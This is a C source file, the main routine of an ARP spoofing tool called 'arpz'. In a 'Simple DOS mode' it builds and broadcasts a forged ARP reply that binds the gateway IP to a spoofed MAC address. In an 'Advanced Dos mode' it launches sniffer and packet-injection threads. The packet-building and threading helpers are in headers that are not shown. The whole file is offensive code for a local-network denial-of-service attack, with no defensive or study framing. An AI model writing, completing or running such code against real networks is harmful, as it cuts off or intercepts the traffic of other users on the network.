/**
Main function
@author zhpeng
@version 10.05.26
*/

#include "arpz_header.h"
#include "arpz_util.h"

int main (int argc, char *argv[]) {
    int mode, sockfd;
    char gwip[20], tgtip[20], rstfile[20];
	extern char device[];
    char *pkt;

    ParseCmd(argc, argv, &mode, gwip, tgtip, rstfile, device);

    if (mode == 0) {    /*Simple DOS mode*/
        if (strlen(gwip) == 0 || strlen(device) == 0) {
            fprintf(stderr, "\nUsage:arpz -g <gateway ip> -d <device>\n\n");
            exit(-1);
        }
        
        /*Create Raw Socket*/
        sockfd = CreateRawSocket(ETH_P_ALL);
        /*Bind*/
        BindToInterface(sockfd, device, ETH_P_ARP);
        
        /*Construct Package*/
        pkt = malloc(sizeof(struct ethernet_header) + sizeof(struct arp_header));
        CreateEtherHeader(pkt, BRAODCAST_MAC, SPOOFED_MAC, ETH_P_ARP);
        CreateARPHeader(pkt, SPOOFED_MAC, gwip, BRAODCAST_MAC, tgtip);
        SendPacket(sockfd, pkt, sizeof(struct ethernet_header) + sizeof(struct arp_header));
    }else if (mode == 1) {  /*Advanced Dos mode*/
		pthread_t sniffer, injector;
		int msgq;
		
		/*init message queue*/
		msgq = CreateMsgQu();
		
		printf("Main %d\n", msgq);
		
		/*Start threads*/
		if ((pthread_create(&sniffer, NULL, SnifferThread, &msgq)) != 0) {
		printf("Error Create Threads\n");
		exit(-1);
		}

		if ((pthread_create(&injector, NULL, InjectionThread, &msgq)) != 0) {
		printf("Error Create Threads\n");
		exit(-1);
		}

		/*Wait child threads*/
		pthread_join(sniffer, NULL);
		pthread_join(injector, NULL);

		/*Destroy message queue*/
		DestroyMsgQ(msgq);
    }

    return 0;
}
